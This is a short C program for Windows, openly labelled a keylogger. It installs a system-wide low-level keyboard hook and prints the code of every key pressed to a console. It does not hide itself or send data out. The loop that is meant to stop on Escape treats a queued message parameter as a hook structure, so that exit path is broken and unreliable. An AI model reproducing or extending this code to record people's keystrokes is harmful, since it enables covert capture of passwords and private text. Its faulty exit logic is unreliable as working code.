#include <windows.h>
#include <stdio.h>

HHOOK hHook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        printf("Key pressed: %d\n", kbd->vkCode);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    HINSTANCE hInstance = GetModuleHandle(NULL);

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (!hHook) {
        printf("Failed to set hook: %lu\n", GetLastError());
        return 1;
    }

    printf("Keylogger started.\n");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_KEYDOWN) {
            if (((KBDLLHOOKSTRUCT*)msg.lParam)->vkCode == VK_ESCAPE) break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
